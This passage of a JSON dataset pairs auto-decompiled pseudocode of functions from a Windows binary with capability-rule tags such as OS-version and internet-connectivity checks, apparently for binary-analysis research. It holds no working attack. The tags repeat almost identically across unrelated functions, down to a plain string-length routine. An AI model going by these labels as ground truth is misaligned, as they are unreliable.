var_2ch;\n            if (var_18h < 0x10) {\n                puVar2 = &var_2ch;\n            }\n            iVar1 = var_30h - puVar2;\n            if (iVar1 != 0) {\n                puVar2 = var_2ch;\n                if (var_18h < 0x10) {\n                    puVar2 = &var_2ch;\n                }\n                iVar3 = fcn.0042e597(puVar2, 1, iVar1, param_1[0x15]);\n                if (iVar1 != iVar3) goto code_r0x0041a1ad;\n            }\n            if (*(param_1 + 0x49) == '\\0') goto code_r0x0041a1b9;\n            if (iVar1 == 0) {\n                fcn.0040bc10(8, 0);\n            }\n        }\n        if (iVar1 == 1) goto code_r0x0041a157;\n        if (iVar1 != 3) {\ncode_r0x0041a1ad:\n            fcn.00405ce0();\n            goto code_r0x0041a1c0;\n        }\ncode_r0x0041a1b9:\n        fcn.00405ce0();\n    }\ncode_r0x0041a1c0:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(var_30h);\n    return;\n}\n",
        "token_count": 829
    },
    "0041a1e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.0041a1e0(int32_t *param_1, int32_t param_2, uint8_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    bool bVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_8h;\n    int32_t var_ch_3;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_11h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eb70;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    var_18h = 0;\n    bVar3 = false;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n    }\n    var_4h = 0;\n    cVar4 = fcn.004197d0(1);\n    uVar5 = 0;\n    if (cVar4 != '\\0') {\n        var_4h = 2;\n        fcn.00405a90(0, 0xffffffff);\n        piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n        if ((*piVar1[8] == NULL) || (*piVar1[0xc] < 1)) {\n            uVar5 = (**(*piVar1 + 0x18))();\n        }\n        else {\n            uVar5 = **piVar1[8];\n        }\n        while (uVar5 != 0xffffffff) {\n            if (uVar5 == var_10h_2) {\n                piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n                bVar3 = true;\n                if ((*piVar1[8] == 0) || (piVar2 = piVar1[0xc],  *piVar2 < 1)) {\n                    (**(*piVar1 + 0x1c))();\n                }\n                else {\n                    *piVar2 = *piVar2 + -1;\n                    *piVar1[8] = *piVar1[8] + 1;\n                }\n                goto code_r0x0041a2d0;\n            }\n            if (0xfffffffd < *(var_ch_3 + 0x10)) {\n                var_18h = 2;\n                goto code_r0x0041a2d0;\n            }\n            fcn.0040bc10(1, uVar5);\n            bVar3 = true;\n            uVar5 = fcn.00419380();\n        }\n        var_18h = 1;\ncode_r0x0041a2d0:\n        uVar5 = var_18h;\n        if (bVar3) goto code_r0x0041a2e3;\n    }\n    var_18h = uVar5 | 2;\ncode_r0x0041a2e3:\n    var_4h = 1;\n    if (var_18h != 0) {\n        var_18h = *(var_8h + *(*var_8h + 4) + 0xc) | var_18h;\n        if (*(var_8h + *(*var_8h + 4) + 0x38) == 0) {\n            var_18h = var_18h | 4;\n        }\n        fcn.00418a20(var_18h, 0);\n    }\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    var_4h = 0xffffffff;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 955
    },
    "0041a720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a720(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    uint32_t arg_10h_00;\n    \n    arg_ch_00 = arg_ch;\n    arg_10h_00 = arg_10h;\n    if (((**(in_ECX + 0x20) == in_ECX + 0x48) && (arg_14h == 1)) && (*(in_ECX + 0x44) == 0)) {\n        arg_ch_00 = arg_ch - 1;\n        arg_10h_00 = (arg_10h - 1) + (arg_ch != 0);\n    }\n    if ((((*(in_ECX + 0x54) != 0) && (cVar2 = fcn.0041a090(),  cVar2 != '\\0')) &&\n        ((((arg_ch_00 | arg_10h_00) == 0 && (arg_14h == 1)) ||\n         (iVar3 = fcn.0042e708(*(in_ECX + 0x54), arg_ch_00, arg_10h_00, arg_14h),  iVar3 == 0)))) &&\n       (iVar3 = fcn.0042e611(*(in_ECX + 0x54), &arg_ch),  iVar3 == 0)) {\n        if (**(in_ECX + 0x10) == in_ECX + 0x48) {\n            uVar1 = *(in_ECX + 0x40);\n            **(in_ECX + 0x10) = *(in_ECX + 0x3c);\n            **(in_ECX + 0x20) = uVar1;\n            **(in_ECX + 0x30) = 0;\n        }\n        arg_8h[2] = arg_ch;\n        uVar1 = *(in_ECX + 0x4c);\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        arg_8h[3] = arg_10h;\n        arg_8h[4] = uVar1;\n        return;\n    }\n    uVar1 = *0x4488e8;\n    arg_8h[1] = *0x4488ec;\n    *arg_8h = uVar1;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 608
    },
    "0041ab50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ab50(uint *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43ebf8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x447a44;\n    var_4h = 0;\n    if ((param_1[0x15] != 0) && (*param_1[4] == param_1 + 0x12)) {\n        uVar1 = param_1[0x10];\n        *param_1[4] = param_1[0xf];\n        *param_1[8] = uVar1;\n        *param_1[0xc] = 0;\n    }\n    if (*(param_1 + 0x14) != '\\0') {\n        fcn.0041a8f0(uVar2);\n    }\n    var_4h = 0xffffffff;\n    fcn.00418c30();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 296
    },
    "0041b9c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_558h\n// WARNING: Variable defined which should be unmapped: var_574h\n// WARNING: Variable defined which should be unmapped: var_570h\n// WARNING: Variable defined which should be unmapped: var_568h\n// WARNING: Variable defined which should be unmapped: var_564h\n// WARNING: Variable defined which should be unmapped: var_560h\n// WARNING: Variable defined which should be unmapped: var_55ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041b9c0(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h, uint *arg_18h, uint *arg_1ch, uint *arg_20h, \n            uint *arg_24h)\n\n{\n    uint *puVar1;\n    uint *arg_18h_00;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *arg_10h_00;\n    uint *arg_14h_00;\n    uint *puVar3;\n    uint *var_574h;\n    uint *var_570h;\n    uint *var_568h;\n    uint *var_564h;\n    uint *var_560h;\n    uint *var_55ch;\n    uint *var_558h;\n    uint var_554h;\n    uint *puStack1364;\n    uint *puStack1360;\n    uint *puStack1356;\n    uint *puStack1352;\n    uint *puStack1348;\n    uint var_528h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_564h = arg_8h;\n    var_55ch = arg_1ch;\n    var_558h = arg_18h;\n    var_568h = arg_ch;\n    var_560h = arg_20h;\n    (**0x4690ac)(&fcn.0041b9c0::var_414h, 0x446f98, arg_ch);\n    arg_14h_00 = &fcn.0041b9c0::var_554h;\n    arg_10h_00 = &fcn.0041b9c0::var_414h;\n    var_574h = (**0x469318)();\n    var_570h = NULL;\n    if (var_574h != 0xffffffff) {\n        do {\n            arg_18h_00 = var_558h;\n            puVar3 = var_55ch;\n            puVar1 = var_564h;\n            arg_ch_00 = 0x446e5c;\n            arg_8h_00 = &fcn.0041b9c0::var_528h;\n            iVar2 = (**0x469288)();\n            if ((iVar2 != 0) && (iVar2 = (**0x469288)(&fcn.0041b9c0::var_528h, 0x446e58),  iVar2 != 0)) {\n                (**0x4690ac)(&fcn.0041b9c0::var_108h, 0x446e60, var_568h, &fcn.0041b9c0::var_528h);\n                fcn.0042acb0(&fcn.0041b9c0::var_20ch, 0, 0x104);\n                (**0x4690ac)(&fcn.0041b9c0::var_20ch, 0x447284, var_568h, &fcn.0041b9c0::var_528h, *0x4583ec, \n                             str.._AV___Iosb_H_std__._0_4_);\n                fcn.0042acb0(&fcn.0041b9c0::var_310h, 0, 0x104);\n                (**0x4690ac)(&fcn.0041b9c0::var_310h, 0x447290, var_568h, *0x4583ec, str.._AV___Iosb_H_std__._0_4_);\n                iVar2 = (**0x469288)(&fcn.0041b9c0::var_528h, *0x458004);\n                if (iVar2 == 0) {\n                    puStack1348 = var_560h;\n                    puStack1352 = var_558h;\n                    puStack1356 = arg_14h;\n                    puStack1360 = arg_10h;\n                    puStack1364 = &fcn.0041b9c0::var_108h;\n                    var_558h = 0x41bb63;\n                    fcn.0041ae20(var_564h, puStack1364, arg_10h, arg_14h, arg_18h_00, var_560h);\n                    if ((arg_24h != NULL) && (var_570h == NULL)) {\n                        var_558h = var_55ch;\n                        var_55ch = 0x41bb63;\n                        var_560h = arg_14h;\n                        var_564h = arg_10h;\n                        var_568h = 0x4453cc;\n                        fcn.0041b130(&fcn.0041b9c0::var_310h, 0x4453cc, arg_10h, arg_14h, 0x41bb63, puVar3);\n                    }\ncode_r0x0041bb9f:\n                    var_570h = arg_24h;\n                    var_574h = var_560h;\n                    arg_8h_00 = &fcn.0041b9c0::var_528h;\n                    arg_10h_00 = &fcn.0041b9c0::var_108h;\n                    arg_14h_00 = arg_10h;\n                    unaff_EDI = arg_14h;\n                    unaff_ESI = var_558h;\n                    puVar3 = var_55ch;\ncode_r0x0041bd78:\n                    fcn.0041b9c0(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00, unaff_EDI, unaff_ESI, puVar3, var_574h);\n                }\n                else {\n                    puStack1348 = str.._AV___Iosb_H_std__._0_4_;\n                    puStack1352 = &fcn.0041b9c0::var_528h;\n                    puStack1356 = 0x41bbe0;\n                    iVar2 = (**0x469288)();\n                    if (iVar2 == 0) {\n                        var_558h = var_55ch;\n                        var_55ch = arg_18h_00;\n                        var_560h = arg_14h;\n                        var_564h = arg_10h;\n                        var_568h = puVar1;\n                        fcn.0041b130(&fcn.0041b9c0::var_108h, puVar1, arg_10h, arg_14h, arg_18h_00, puVar3);\n                        goto code_r0x0041bb9f;\n                    }\n                    var_558h = &fcn.0041b9c0::var_20ch;\n                    iVar2 = fcn.00420f90(var_558h);\n                    puVar1 = *0x4580a8;\n                    var_560h = &fcn.0041b9c0::var_528h;\n                    if (iVar2 != 0) {\n                        var_55ch = 0x41bc1d;\n                        var_564h = arg_14h;\n                        var_568h = arg_10h;\n                        var_570h = &fcn.0041b9c0::var_20ch;\n                        fcn.0041b130(var_570h, var_560h, arg_10h, arg_14h, var_558h, 0x41bc1d);\n                        var_574h = arg_24h;\n                        unaff_ESI = 0x41bc1d;\n                        arg_ch_00 = &fcn.0041b9c0::var_108h;\n                        arg_8h_00 = &fcn.0041b9c0::var_528h;\n                        arg_10h_00 = arg_10h;\n                        arg_14h_00 = arg_14h;\n                        unaff_EDI = var_558h;\n                        puVar3 = var_558h;\n                        var_560h = var_558h;\n                        goto code_r0x0041bd78;\n                    }\n                    var_55ch = *0x4580a8;\n                    var_564h = 0x41bc82;\n                    iVar2 = (**0x469288)();\n                    if (iVar2 == 0) {\n                        if (*(in_ECX + 2) != '\\0') {\n                            fcn.00415df0(&fcn.0041b9c0::var_108h, 0x41bc82, arg_10h, arg_14h, var_558h, puVar1);\n                            arg_ch_00 = var_558h;\n                            fcn.00415fe0(&fcn.0041b9c0::var_108h, 0x41bc82, arg_10h, arg_14h, var_558h, puVar1);\n                        }\n                        goto code_r0x0041bb9f;\n                    }\n                    var_570h = *0x457dfc;\n                    var_574h = &fcn.0041b9c0::var_528h;\n                    puVar3 = 0x41bcf1;\n                    iVar2 = (**0x469288)();\n                    if (iVar2 == 0) {\n                        if (*(in_ECX + 1) != '\\0') {\n                            fcn.0041b650(&fcn.0041b9c0::var_108h, 0x41bc82, arg_10h, arg_14h, var_558h, puVar1);\n                            fcn.00415bd0(&fcn.0041b9c0::var_108h, 0x41bc82, arg_10h, arg_14h, var_558h, puVar1);\n                        }\n                        goto code_r0x0041bd78;\n                    }\n                    if ((var_554h & 0x10) != 0) goto code_r0x0041bd78;\n                }\n                fcn.0042acb0(&fcn.0041b9c0::var_20ch, 0, 0x104);\n                fcn.0042acb0(&fcn.0041b9c0::var_310h, 0, 0x104);\n            }\n            iVar2 = (**0x469170)(var_574h, &fcn.0041b9c0::var_554h);\n        } while (iVar2 != 0);\n        (**0x4690e0)(var_574h);\n    }\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 2537
    },
    "0041d0e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041d0e0(uint arg_8h, uint32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ee92;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_14h != 0) {\n        *in_ECX = 0x447ba0;\n        in_ECX[0x1a] = 0x447934;\n        var_4h = 0;\n    }\n    *(in_ECX + *(*in_ECX + 4)) = 0x44792c;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    iVar3 = *(*in_ECX + 4);\n    fcn.00418b50(uVar2);\n    *(in_ECX + iVar3 + 0x38) = in_ECX + 4;\n    *(in_ECX + iVar3 + 0x3c) = 0;\n    uVar1 = fcn.00419b60(0x20);\n    *(in_ECX + iVar3 + 0x40) = uVar1;\n    if (*(in_ECX + iVar3 + 0x38) == 0) {\n        fcn.00418a20(*(in_ECX + iVar3 + 0xc) | 4, 0);\n    }\n    var_4h = 2;\n    *(in_ECX + *(*in_ECX + 4)) = 0x447b9c;\n    fcn.004194a0();\n    in_ECX[4] = 0x447a44;\n    *(in_ECX + 0x18) = 0;\n    *(in_ECX + 0x59) = 0;\n    in_ECX[8] = in_ECX + 6;\n    in_ECX[0xc] = in_ECX + 10;\n    in_ECX[0xd] = in_ECX + 0xb;\n    in_ECX[9] = in_ECX + 7;\n    in_ECX[0x10] = in_ECX + 0xe;\n    in_ECX[0x11] = in_ECX + 0xf;\n    in_ECX[7] = 0;\n    *in_ECX[0xd] = 0;\n    *in_ECX[0x11] = 0;\n    *in_ECX[8] = 0;\n    *in_ECX[0xc] = 0;\n    *in_ECX[0x10] = 0;\n    in_ECX[0x19] = 0;\n    in_ECX[0x17] = *0x468800;\n    in_ECX[0x15] = 0;\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    iVar3 = fcn.00419d90(arg_8h, arg_ch | 1, arg_10h);\n    if (iVar3 == 0) {\n        uVar2 = *(*(*in_ECX + 4) + 0xc + in_ECX);\n        arg_8h_00 = uVar2 | 2;\n        if (*(in_ECX + *(*in_ECX + 4) + 0x38) == 0) {\n            arg_8h_00 = uVar2 | 6;\n        }\n        fcn.00418a20(arg_8h_00, 0);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 915
    },
    "0041d250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041d250(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x43eec3;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(*(*(param_1 + -0x68) + 4) + -0x68 + param_1) = 0x447b9c;\n    *(param_1 + -0x58) = 0x447a44;\n    var_4h._0_1_ = 1;\n    var_4h._1_3_ = 0;\n    if ((*(param_1 + -4) != 0) && (**(param_1 + -0x48) == param_1 + -0x10)) {\n        uVar1 = *(param_1 + -0x18);\n        **(param_1 + -0x48) = *(param_1 + -0x1c);\n        **(param_1 + -0x38) = uVar1;\n        **(param_1 + -0x28) = 0;\n    }\n    if (*(param_1 + -8) != '\\0') {\n        fcn.0041a8f0(uVar2);\n    }\n    var_4h = var_4h._1_3_ << 8;\n    fcn.00418c30();\n    *(*(*(param_1 + -0x68) + 4) + -0x10 + param_1 + -0x58) = 0x44792c;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 442
    },
    "0041f240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0041f240(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t *arg_8h;\n    int32_t iVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    arg_8h = NULL;\n    var_4h = 0;\n    uVar3 = 0;\n    var_8h = 0;\n    iVar4 = 0;\n    iVar1 = (**0x44004c)(0xffff, 0, &var_4h);\n    while( true ) {\n        if (iVar1 != 0) {\n            piVar2 = arg_8h;\n            if (var_4h != 0) {\n                do {\n                    piVar2 = piVar2 + iVar4;\n                    if (*piVar2 == 0) {\n                        var_8h = var_8h + 1;\n                    }\n                    iVar4 = piVar2[1];\n                    uVar3 = uVar3 + iVar4;\n                } while (uVar3 < var_4h);\n            }\n            fcn.0042aeff(arg_8h);\n            return var_8h;\n        }\n        iVar1 = (**0x469220)();\n        if (iVar1 != 0x7a) break;\n        if (arg_8h != NULL) {\n            fcn.0042aeff(arg_8h);\n        }\n        arg_8h = fcn.0042ae6b(var_4h);\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        iVar1 = (**0x44004c)(0xffff, arg_8h, &var_4h);\n    }\n    if (arg_8h != NULL) {\n        fcn.0042aeff(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 423
    },
    "0041f5b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041f5b0(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_44h;\n    uint32_t var_3ch;\n    uint32_t var_38h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    arg_8h = (**0x4692b4)(0, 0x104);\n    uVar1 = (**0x46923c)();\n    fcn.0042acb0(&var_44h, 0, 0x40);\n    var_44h = 0x40;\n    iVar2 = (**0x469310)(&var_44h);\n    if (iVar2 == 1) {\n        uVar3 = var_3ch >> 0x14 | var_38h << 0xc;\n        var_38h = var_38h >> 0x14;\n    }\n    else {\n        uVar3 = 0;\n        var_38h = 0;\n    }\n    (**0x4690ac)(uVar1, 0x447d54, uVar3, var_38h);\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 297
    },
    "0041f760": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041f760(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = (**0x4692d4)(&var_4h);\n    iVar2 = (**0x469278)(uVar1);\n    if ((iVar2 == 0) || (uVar1 = 0x447da4,  var_4h == 0)) {\n        uVar1 = 0x447da0;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00420e80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420e80(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = *arg_8h;\n    while (cVar1 != '\\0') {\n        arg_8h = arg_8h + 1;\n        iVar2 = iVar2 + 1;\n        cVar1 = *arg_8h;\n    }\n    return iVar2;\n}\n",
        "token_count": 107
    },
    "00421960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00421960(int32_t param_1, uint param_2, char param_3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f3b0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    puVar1 = fcn.0042eac1();\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    var_4h = 0;\n    puVar5 = 0x4453cc;\n    if (var_ch_2 == '\\0') {\n        puVar5 = puVar1[2];\n    }\n    fcn.0042ab3e();\n    iVar2 = fcn.0042b420(puVar5);\n    iVar2 = iVar2 + 1;\n    puVar3 = fcn.0042a209(iVar2);\n    puVar4 = puVar3;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar5;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *(param_1 + 8) = puVar3;\n    fcn.0042ab3e();\n    iVar2 = fcn.0042b420(0x447124);\n    iVar2 = iVar2 + 1;\n    puVar4 = fcn.0042a209(iVar2);\n    puVar3 = 0x447124;\n    puVar5 = puVar4;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar3;\n        puVar5 = puVar5 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(param_1 + 0x10) = puVar4;\n    fcn.0042ab3e();\n    iVar2 = fcn.0042b420(0x44712c);\n    iVar2 = iVar2 + 1;\n    puVar4 = fcn.0042a209(iVar2);\n    puVar3 = 0x44712c;\n    puVar5 = puVar4;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar3;\n        puVar5 = puVar5 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(param_1 + 0x14) = puVar4;\n    fcn.0042ab3e();\n    *(param_1 + 0xc) = **puVar1;\n    fcn.0042ab3e();\n    *(param_1 + 0xd) = *puVar1[1];\n    if (var_ch_2 != '\\0') {\n        fcn.0042ab3e();\n        *(param_1 + 0xc) = 0x2e;\n        fcn.0042ab3e();\n        *(param_1 + 0xd) = 0x2c;\n    }\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 839
    },
    "00421b30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421b30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    \n    if ((*(*(*in_ECX + 4) + 0xc + in_ECX) & 6) == 0) {\n        (**(**(*(*in_ECX + 4) + 0x38 + in_ECX) + 0x28))(&var_18h, arg_8h, arg_ch, arg_10h, 1);\n        if ((var_10h + var_18h == *0x4488e8) && ((var_10h >> 0x1f) + var_14h + CARRY4(var_10h, var_18h) == *0x4488ec)) {\n            uVar1 = *(*(*in_ECX + 4) + 0xc + in_ECX);\n            arg_8h_00 = uVar1 | 2;\n            if (*(in_ECX + *(*in_ECX + 4) + 0x38) == 0) {\n                arg_8h_00 = uVar1 | 6;\n            }\n            fcn.00418a20(arg_8h_00, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "00421e20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00421e20(uint noname_0, uint *arg_ch, uint arg_10h, int32_t *arg_14h, uint8_t *arg_18h, int32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    \n    if (arg_1ch != 0) {\n        do {\n            if (arg_14h == NULL) {\ncode_r0x00421e6f:\n                arg_10h = CONCAT31(arg_10h._1_3_, 1);\n            }\n            else {\n                uVar1 = *arg_18h;\n                if ((*arg_14h[9] == 0) || (piVar2 = arg_14h[0xd],  *piVar2 < 1)) {\n                    uVar4 = (**(*arg_14h + 0xc))(uVar1);\n                }\n                else {\n                    *piVar2 = *piVar2 + -1;\n                    puVar3 = *arg_14h[9];\n                    *arg_14h[9] = puVar3 + 1;\n                    *puVar3 = uVar1;\n                    uVar4 = uVar1;\n                }\n                if (uVar4 == 0xffffffff) goto code_r0x00421e6f;\n            }\n            arg_18h = arg_18h + 1;\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 382
    },
    "00421e90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
